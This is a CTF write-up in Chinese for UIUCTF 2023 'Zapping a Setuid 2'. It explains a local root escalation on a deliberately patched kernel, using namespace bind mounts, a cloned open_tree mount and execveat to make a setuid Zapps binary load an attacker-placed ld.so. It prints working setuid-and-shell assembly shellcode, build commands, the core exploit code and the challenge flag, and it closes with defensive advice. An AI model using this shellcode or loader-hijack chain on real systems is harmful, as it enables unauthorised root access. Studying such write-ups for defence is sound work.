# UIUCTF 2023 Zapping a Setuid 2 Writeup

## 题目简述

第二版继续使用自加载的 Zapps setuid 程序：它从 `/proc/self/exe` 得到自己的路径，并加载同目录的 `ld-linux-x86-64.so.2`。但这次 `fs.protected_hardlinks=1`，普通用户不能再给 root 的 setuid inode 创建硬链接。

题目内核额外修改了 `open_tree` 和 setuid mount 检查，暗示通过 user/mount namespace 构造一个“执行时来自可信 setuid 文件、路径解析时却落入攻击者目录”的不一致视图。

## 解题过程

### 1. 准备恶意加载器

在真实 `/home/user` 中生成名为 `ld-linux-x86-64.so.2` 的静态 PIE。载荷先调用 `setuid(0)` 统一真实、有效和保存 UID，再执行 BusyBox `/bin/sh`：

```asm
.globl _start
.section .text,"ax",@progbits
.type _start, @function
_start:
.cfi_startproc
    xor %rdi, %rdi
    mov $105, %al
    syscall                         # setuid(0)

    xor %rsi, %rsi
    push %rsi
    mov $0x6873612f2f2f2f2f, %rsi
    push %rsi                       # "/////ash"
    mov %rsp, %rdi
    push $0
    push %rdi
    mov %rsp, %rsi                  # argv

    xor %rdx, %rdx
    push %rdx
    mov $0x68732f2f6e69622f, %rdi
    push %rdi                       # "/bin//sh"
    mov %rsp, %rdi
    mov $59, %al
    cdq
    syscall                         # execve
.cfi_endproc
```

```bash
gcc -o ld-linux-x86-64.so.2 \
    -static-pie -nostartfiles -Wl,--gc-sections payload.S
```

### 2. 在子 namespace 中伪造路径视图

父子进程先建立 Unix `socketpair`。子进程执行：

```c
unshare(CLONE_NEWUSER | CLONE_NEWNS);
mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL);
int rootfd = open("/", O_PATH);
send_fd(socket_to_parent, rootfd);   /* SCM_RIGHTS */
pause();
```

在子 mount namespace 中，`/home/user/exe` 指向 `/usr/lib/zapps/build/exe`，即真正的 root-owned setuid Zapps；原来放在 `/home/user` 的恶意加载器暂时被 bind mount 隐藏。

### 3. 父进程克隆 mount tree 并跨视图执行

父进程通过 `SCM_RIGHTS` 收到子 namespace 根目录的 O_PATH fd，然后调用：

```c
int treefd = syscall(
    SYS_open_tree,
    rootfd,
    "",
    AT_EMPTY_PATH | AT_RECURSIVE | OPEN_TREE_CLONE
);

syscall(
    SYS_execveat,
    treefd,
    "home/user/exe",
    NULL,
    NULL,
    0
);
```

题目内核的三处补丁分别允许非特权 detached `open_tree`、跨 mount namespace 克隆，并放宽 foreign mount 的 `mnt_may_suid` 判断。因此 `execveat` 对克隆树中的 `/home/user/exe` 仍应用 setuid 位。

关键不一致发生在程序启动后：被执行 inode 来自克隆 mount tree 中的正版 Zapps，但进程随后执行普通绝对路径查找。`readlink("/proc/self/exe")` 形成 `/home/user/exe`，Zapps 再打开 `/home/user/ld-linux-x86-64.so.2` 时，查找发生在父进程原来的 mount namespace，于是命中攻击者预先放置的恶意加载器。

完整 exploit 的其余部分只是标准的 `sendmsg/recvmsg` 加 `SCM_RIGHTS` 传 fd。编译并触发：

```bash
gcc -O2 -o exploit exploit.c
./exploit
id
cat /mnt/flag
```

最终得到：

```text
uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}
```

## 方法总结

利用链是 `user+mount namespace → bind mount 制造可信 /home/user/exe → open_tree 克隆 foreign mount → execveat 保留 setuid → /proc/self/exe 文本路径回到原 namespace → 加载攻击者 ld.so`。它利用的是“执行所用 file 对象”和“稍后按字符串重新解析的路径”属于不同挂载视图。内核对 foreign mount 的 nosuid、跨 namespace clone 和 `open_tree` 权限限制正是为阻断这种混淆；高权限自加载器也应使用已打开的可信目录 fd 和 `openat2` 约束，而不是重新信任 `/proc/self/exe` 字符串。
